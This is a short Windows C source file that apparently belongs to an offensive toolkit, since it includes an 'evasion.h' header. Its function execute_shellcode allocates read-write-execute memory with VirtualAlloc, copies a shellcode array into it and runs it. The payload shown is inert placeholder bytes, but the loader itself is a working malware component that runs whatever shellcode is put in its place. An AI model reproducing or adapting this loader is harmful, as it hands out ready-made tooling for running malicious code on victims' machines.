#include <windows.h>
#include "../include/evasion.h"
unsigned char sc[]={0x90,0x90,0x90,0xC3};
void execute_shellcode() {
    void* m=VirtualAlloc(0,sizeof sc,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);
    memcpy(m,sc,sizeof sc);
    ((void(*)())m)();
}
